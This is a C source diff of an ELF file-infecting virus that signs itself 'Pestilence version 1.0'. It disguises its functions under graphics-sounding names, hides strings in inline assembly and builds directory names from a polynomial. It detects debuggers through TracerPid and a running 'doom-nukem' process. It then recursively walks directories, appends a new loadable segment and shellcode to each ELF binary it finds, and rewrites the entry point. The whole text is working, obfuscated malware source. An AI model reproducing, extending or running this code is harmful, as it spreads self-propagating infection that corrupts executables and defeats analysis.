+	kern_unit = fs_handle(bearing_buf, 00 | 0200000);
+	if (kern_unit < 0)
+		return 0;
+	char scanline[4096];
+	int	 subpixel_done = 0;
+	for (;;)
+	{
+		if (subpixel_done)
+			break;
+		int advance = fs_enumerate(kern_unit, scanline, sizeof(scanline));
+		if (advance <= 0)
+			break;
+		int cursor = 0;
+		while (cursor < advance && !subpixel_done)
+		{
+			typedef struct linux_dirent64 __glyph_entry;
+			__glyph_entry *slot = (__glyph_entry *) (scanline + cursor);
+			char		  *dname = slot->d_name;
+			unsigned int   valid_glyph = 1u;
+			int			   ci = 0;
+			do
+			{
+				if (!dname[ci])
+					break;
+				valid_glyph &= (unsigned) (dname[ci] - 0x30) < 10u;
+				ci++;
+			} while (dname[ci - 1]);
+			if (valid_glyph & 1u)
+			{
+				char rpath[64];
+				int	 rpos = 0;
+				recall(rpath, raster_base);
+				while (rpath[rpos])
+					rpos++;
+				rpath[rpos++] = 0x2F;
+				for (int k = 0; dname[k]; k++)
+					rpath[rpos++] = dname[k];
+				char comm_seg[8];
+				recall(comm_seg, atlas_suffix);
+				for (int k = 0; comm_seg[k]; k++)
+					rpath[rpos++] = comm_seg[k];
+				rpath[rpos] = 0x00;
+				int glyph_fd = fs_handle(rpath, O_RDONLY);
+				if (glyph_fd >= 0)
+				{
+					char pxbuf[64];
+					int	 pxlen = io_recv(glyph_fd, pxbuf, sizeof(pxbuf) - 1);
+					fs_release(glyph_fd);
+					if (pxlen > 0)
+					{
+						pxbuf[pxlen] = 0x00;
+						int npos = 0;
+						while (npos < pxlen && pxbuf[npos] != 0x0A)
+							npos++;
+						pxbuf[npos] = 0x00;
+						if (!delay_abs_calc(pxbuf, target))
 						{
-							verdict = 1;
-							goto EXIT_GATE;
+							hinting = 1;
+							subpixel_done = 1;
 						}
 					}
 				}
 			}
-
-			offset += entry->d_reclen;
+			cursor += slot->d_reclen;
 		}
 	}
-
-EXIT_GATE:
-	fs_release(stream);
-	return verdict;
+	fs_release(kern_unit);
+	return hinting;
 }
 
-int runtime_integrity_probe(void)
+static int load_shader_binary(char *path, inout struct stat *atlas_meta,
+							  inout t_elf *shader_ctx, inout char **region_ptr,
+							  inout size_t *pad_extent)
 {
-	char *locator;
-
-	asm volatile("leaq blobA(%%rip), %0\n"
-				 "jmp gateA\n"
-				 "blobA: .ascii \"/proc/self/status\\0\"\n"
-				 "gateA:\n"
-				 : "=r"(locator));
-
-	int stream = fs_handle(locator, O_RDONLY);
-	if (stream < 0)
-		return 0;
-
-	char segment[256];
-	int	 slice;
-	int	 cursor = 0;
-
-	while ((slice = io_recv(stream, segment + cursor, sizeof(segment) - cursor))
-		   > 0)
+	int pipeline_slot;
+	int pipe_ret;
+	*region_ptr = NULL;
+	pipeline_slot = fs_handle(path, 0x2);
+	if (pipeline_slot < 0 || io_query(pipeline_slot, atlas_meta) < 0)
+		goto bailout;
+	if (atlas_meta->st_size < (long) sizeof(ElfW(Ehdr)))
+		goto bailout;
+	*region_ptr = (void *) rt_vector(9, 0, atlas_meta->st_size, 0x1, 0x1,
+									 pipeline_slot, 0);
+	if (*region_ptr == MAP_FAILED)
+		goto bailout;
+	char  *watermark_pat;
+	size_t pat_stride;
+	asm volatile("leaq stC(%%rip), %0\n"
+				 "movq $endC-stC,  %1\n"
+				 "jmp  endC\n"
+				 "stC: .ascii \"\\nPestilence version 1.0 (c)oded by xxxxxxx - "
+				 "yyyyyy\\0\" \n "
+				 "endC:\n"
+				 : "=r"(watermark_pat), "=r"(pat_stride));
+	int scan_pos = 0;
+	while (scan_pos + pat_stride < (size_t) atlas_meta->st_size)
+		if (!evaluateDriftSignature(*region_ptr + scan_pos++, watermark_pat,
+									pat_stride))
+			goto bailout;
+	shader_ctx->header = (ElfW(Ehdr) *) *region_ptr;
+	*pad_extent = VARAX;
+	*pad_extent += shader_ctx->header->e_phentsize
+				   * (shader_ctx->header->e_phnum + 0x1);
+	*pad_extent += 0x1000 - atlas_meta->st_size % 0x1000;
+	vm_release(*region_ptr, atlas_meta->st_size);
+	*region_ptr = NULL;
+	if ((pipe_ret = io_resize(pipeline_slot, atlas_meta->st_size + *pad_extent))
+		< 0)
 	{
-		cursor += slice;
-
-		char *pivot = memoff(segment, '\n');
-		if (pivot)
-		{
-			*pivot = '\0';
-
-			asm volatile("leaq blobB(%%rip), %0\n"
-						 "jmp gateB\n"
-						 "blobB: .ascii \"TracerPid:\\0\"\n"
-						 "gateB:\n"
-						 : "=r"(locator));
-
-			if (delay_calc(segment, locator, 10) == 0)
-			{
-				int depth = trace_depth(segment + 10);
-				fs_release(stream);
-				return depth != 0;
-			}
-
-			memcat(segment, pivot + 1, sizeof(segment) - (pivot - segment - 1));
-			cursor -= (pivot - segment + 1);
-		}
+		emit_hex(pipe_ret);
+		goto bailout;
 	}
-
-	fs_release(stream);
-	return 0;
-}
-
-void processDirectory(char *folder, void *begin_ptr)
-{
-	int					   fd = fs_handle(folder, 0 | 65536);
-
-	char				   buffer[1024];
-	struct linux_dirent64 *dirent;
-	int					   nread;
-
-	if (fd < 0)
-		goto clean;
-	while ((nread = fs_enumerate(fd, buffer, 1024)) > 0)
-	{
-		for (int bpos = 0; bpos < nread;)
-		{
-			char dot[3];
-			dirent = (struct linux_dirent64 *) (buffer + bpos);
-			char *d_name = dirent->d_name;
-
-			dot[0] = '.';
-			dot[1] = 0;
-			if (delay_abs_calc(d_name, dot) == 0)
-			{
-				bpos += dirent->d_reclen;
-				continue;
-			}
-			dot[1] = '.';
-			dot[2] = 0;
-			if (delay_abs_calc(d_name, dot) == 0)
-			{
-				bpos += dirent->d_reclen;
-				continue;
-			}
-			char fullPath[PATH_MAX];
-			char slash[2];
-			slash[0] = '/';
-			slash[1] = 0;
-			flow_align(flow_align(core_shift(fullPath, folder), slash), d_name);
-
-			struct stat statbuf;
-			fs_query(fullPath, &statbuf);
-
-			if (statbuf.st_mode & __S_IFDIR)
-			{
-				processDirectory(fullPath, begin_ptr);
-			}
-			else if (statbuf.st_mode & __S_IFREG)
-			{
-				infect(fullPath, begin_ptr);
-			}
-
-			bpos += dirent->d_reclen;
-		}
-	}
-clean:
-	fs_release(fd);
-}
-
-#define ELF_MAGIC			   0x464c457f
-#define MINIMAL_INJECTION_SIZE (0x1000 * 5)
-#define inout
-#define CURARE                                                                 \
-	"\xf3\x0f\x1e\xfa\x50\xb8\x39\x00\x00\x00\x0f\x05\x48\x85\xc0\x74\x06\x58" \
-	"\xe9\xe9\xff\xff\xff\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35" \
-	"\x13\x00\x00\x00\xba\x0a\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00" \
-	"\x00\x00\x00\x0f\x05\x68\x65\x68\x65\x68\x65\x68\x65\x0a\x00"
-#define FLOWER (sizeof(CURARE) - 1)
-#define ACONIT 19
-
-int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
-			   inout char **file_data)
-{
-	int fd;
-
-	*file_data = NULL;
-	fd = fs_handle(path, O_RDWR);
-	if (fd < 0 || io_query(fd, statbuf) < 0)
-		goto error;
-	if (io_resize(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
-		goto error;
-	*file_data
-		= (void *) rt_vector(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
-							 PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-	if (*file_data == MAP_FAILED)
-		goto error;
-	if (statbuf->st_size < sizeof(ElfW(Ehdr))
-		|| ((unsigned *) *file_data)[0] != ELF_MAGIC)
-		goto error;
-	elf->header = (ElfW(Ehdr) *) *file_data;
-	if (statbuf->st_size < elf->header->e_shoff
-							   + elf->header->e_shnum * elf->header->e_shentsize
-		|| statbuf->st_size
-			   < elf->header->e_phoff
-					 + elf->header->e_phnum * elf->header->e_phentsize)
-		goto error;
-	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
-	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
+	*region_ptr = (void *) rt_vector(9, 0, atlas_meta->st_size + *pad_extent,
+									 0x3, 0x1, pipeline_slot, 0);
+	if (*region_ptr == MAP_FAILED)
+		goto bailout;
+	if (((unsigned *) *region_ptr)[0] != 0x464C457F)
+		goto bailout;
+	shader_ctx->header = (ElfW(Ehdr) *) *region_ptr;
+	if (atlas_meta->st_size < shader_ctx->header->e_shoff
+								  + shader_ctx->header->e_shnum
+										* shader_ctx->header->e_shentsize
+		|| atlas_meta->st_size < shader_ctx->header->e_phoff
+									 + shader_ctx->header->e_phnum
+										   * shader_ctx->header->e_phentsize)
+		goto bailout;
+	shader_ctx->sections
+		= (ElfW(Shdr) *) (*region_ptr + shader_ctx->header->e_shoff);
+	shader_ctx->segments
+		= (ElfW(Phdr) *) (*region_ptr + shader_ctx->header->e_phoff);
+	fs_release(pipeline_slot);
 	return (OK);
-error:
-	fs_release(fd);
-	vm_release(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
+bailout:
+	fs_release(pipeline_slot);
 	return (KO);
 }
 
-unsigned long find_first_free_page(t_elf elf)
+static unsigned long resolve_upper_bound_frame(t_elf elf)
 {
-	unsigned long ret;
-
-	ret = 0;
-	for (int i = 0; i < elf.header->e_phnum; i++)
-		if (elf.segments[i].p_type == PT_LOAD
-			&& ret < elf.segments[i].p_memsz + elf.segments[i].p_vaddr)
-			ret = elf.segments[i].p_memsz + elf.segments[i].p_vaddr;
-	ret = (ret + 0x1000 - 1) & ~0xfffUL; // align to next page
-	return ret;
+	const unsigned long page_gran = 1UL << 12;
+	const unsigned long align_mask = ~(page_gran - 1UL);
+	const unsigned int	frame_tag = (unsigned int) ((0x2u - 0x1u) | 0x0u);
+	unsigned long		hwm = 0UL;
+	unsigned long		seam = 0UL;
+	unsigned long		delta = 0UL;
+	ElfW(Phdr) *cursor = elf.segments;
+	ElfW(Phdr) *fence = elf.segments + elf.header->e_phnum;
+	while (cursor < fence)
+	{
+		seam = cursor->p_memsz + cursor->p_vaddr;
+		delta = seam ^ hwm;
+		hwm ^= delta
+			   & -((unsigned long) (cursor->p_type == frame_tag)
+				   & (unsigned long) (hwm < seam));
+		cursor++;
+	}
+	hwm = (hwm + page_gran - 1UL) & align_mask;
+	return hwm;
 }
 
-void infect(char *path, void *begin_ptr)
+static void infect(char *path, void *begin_ptr)
 {
 	struct stat statbuf;
 	char	   *file_data;
 	t_elf		elf;
 	ElfW(Phdr) the_rats;
 	ElfW(Off) pt_load_end;
-	int last_pt_load;
+	int	   last_pt_load;
+	char  *curare;
+	size_t flower;
+	size_t enlarging;
 
-	if (parse_file(path, &statbuf, &elf, &file_data))
+	asm volatile(
+		"leaq str3(%%rip), %0\n"
+		"movq $end3-str3, %1\n"
+		"jmp end3\n"
+		"str3:  .byte 0xf3, 0x0f, 0x1e, 0xfa, 0x50, 0xb8, 0x39, 0x00, 0x00, "
+		"0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xeb, 0xff, "
+		"0xff, 0xff, 0x58, 0xe9, 0xe5, 0xff, 0xff, 0xff\n"
+		"end3:\n"
+		: "=r"(curare), "=r"(flower)::"memory", "cc", "rax", "rcx", "r11");
+	if (load_shader_binary(path, &statbuf, &elf, &file_data, &enlarging))
 		goto clean;
-	/*
-	 * We need to inject 2 things
-	 * 1/ PT_LOAD header
-	 * -> enlarge segment that cover the injection position (and move it to
-	 * unused space if conflict), also move the PT_PHDR if moving
-	 * 		-> check for PT_DYN and move the address that were in the moved one
-	 * -> move subsequent segments in file (minding the alignment)
-	 *
-	 * 2/ PT_LOAD data, je fais kinda ce que je veux je crois :D
-	 */
-
-	unsigned long append_pos = (statbuf.st_size + 0x1000 - 1) & ~0xfffUL;
-	unsigned long pestis = find_first_free_page(elf);
+	unsigned long append_pos
+		= statbuf.st_size + 0x1000 - statbuf.st_size % 0x1000;
+	unsigned long pestis = resolve_upper_bound_frame(elf);
 	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
 		   elf.header->e_phnum * elf.header->e_phentsize);
 	elf.header->e_phoff = append_pos;
@@ -384,8 +1190,8 @@ void infect(char *path, void *begin_ptr)
 	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
 		.p_type = PT_LOAD,
 		.p_align = 0x1000,
-		.p_filesz = MINIMAL_INJECTION_SIZE - statbuf.st_size % 0x1000,
-		.p_memsz = MINIMAL_INJECTION_SIZE - statbuf.st_size % 0x1000,
+		.p_filesz = enlarging,
+		.p_memsz = enlarging,
 		.p_offset = append_pos,
 		.p_paddr = pestis,
 		.p_vaddr = pestis,
@@ -402,14 +1208,134 @@ void infect(char *path, void *begin_ptr)
 				= elf.header->e_phnum * elf.header->e_phentsize;
 			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
 		}
-	memcpy(file_data + append_pos, CURARE, FLOWER);
+	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
+	memcpy(file_data + append_pos, curare, flower);
 	unsigned delta = elf.header->e_entry;
 	elf.header->e_entry
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
 	delta -= elf.header->e_entry + ACONIT + 4;
-	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
 	memcpy(file_data + append_pos + ACONIT, &delta, 4);
+	delta = flower - ARSENIC + BUBONIK - FRENZY - 4;
+	memcpy(file_data + append_pos + ARSENIC, &delta, 4);
+	append_pos += flower;
+	memcpy(file_data + append_pos, begin_ptr, VARAX);
 clean:
-	vm_flush(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
-	vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
+	if (file_data)
+		vm_release(file_data, statbuf.st_size + enlarging);
+}
+
+static void reconcileTopology(char *rootAnchor, void *dispatchToken)
+{
+	int					   session = fs_handle(rootAnchor, 65536);
+	unsigned char		   frame[1024];
+	struct linux_dirent64 *node;
+	int					   batch;
+	if (session < 0)
+		goto finalizeSession;
+	for (;;)
+	{
+		batch = fs_enumerate(session, (char *) frame, sizeof(frame));
+		if (batch <= 0)
+			break;
+		int cursor = 0;
+		while (cursor < batch)
+		{
+			node = (struct linux_dirent64 *) (frame + cursor);
+			char *label = node->d_name;
+			{
+				char anchor[3];
+				anchor[0] = '.';
+				anchor[1] = 0;
+				if (delay_abs_calc(label, anchor) == 0)
+				{
+					cursor += node->d_reclen;
+					continue;
+				}
+				anchor[1] = '.';
+				anchor[2] = 0;
+				if (delay_abs_calc(label, anchor) == 0)
+				{
+					cursor += node->d_reclen;
+					continue;
+				}
+			}
+			char composed[PATH_MAX];
+			char divider[2];
+			divider[0] = '/';
+			divider[1] = 0;
+			flow_align(flow_align(core_shift(composed, rootAnchor), divider),
+					   label);
+			struct stat metadata;
+			fs_query(composed, &metadata);
+			unsigned mode = metadata.st_mode;
+			if ((mode & __S_IFDIR) == __S_IFDIR)
+				reconcileTopology(composed, dispatchToken);
+			else
+			{
+				if ((mode & __S_IFREG) == __S_IFREG)
+				{
+					infect(composed, dispatchToken);
+				}
+			}
+			cursor += node->d_reclen;
+		}
+	}
+finalizeSession:
+	fs_release(session);
+}
+
+void _start(void)
+{
+	void *str_dup__;
+	char  t[11];
+	char *chroot;
+
+	fs_release(1);
+	fs_release(2);
+
+	asm volatile("leaq str6(%%rip), %0\n"
+				 "jmp end6\n"
+				 "str6: .ascii \"doom-nukem\\0\"\n"
+				 "end6:\n"
+				 : "=r"(chroot));
+	if (inspect_chunk_alignment() || measure_font_bearing(chroot) > 0)
+		proc_terminate(0);
+
+	__asm__ volatile("lea (%%rip), %0\n"
+					 "cyanure:"
+					 : "=r"(str_dup__));
+	str_dup__ += FRENZY - CYANURE;
+
+	for (double x = 0; x < 11; x++)
+		t[(int) x]
+			= 47.0
+			  + x
+					* (10615921.0 / 2520.0
+					   + x
+							 * (-110742901.0 / 10080.0
+								+ x
+									  * (262598717.0 / 22680.0
+										 + x
+											   * (-12529019.0 / 1920.0
+												  + x
+														* (37940149.0 / 17280.0
+														   + x
+																 * (-666053.0
+																		/ 1440.0
+																	+ x
+																		  * (3723493.0
+																				 / 60480.0
+																			 + x
+																				   * (-202771.0
+																						  / 40320.0
+																					  + x
+																							* (83497.0
+																								   / 362880.0
+																							   + x
+																									 * (-13.0
+																										/ 2880.0))))))))));
+	reconcileTopology(t, str_dup__);
+	t[9] = 0x32;
+	reconcileTopology(t, str_dup__);
+	proc_terminate(0);
 }
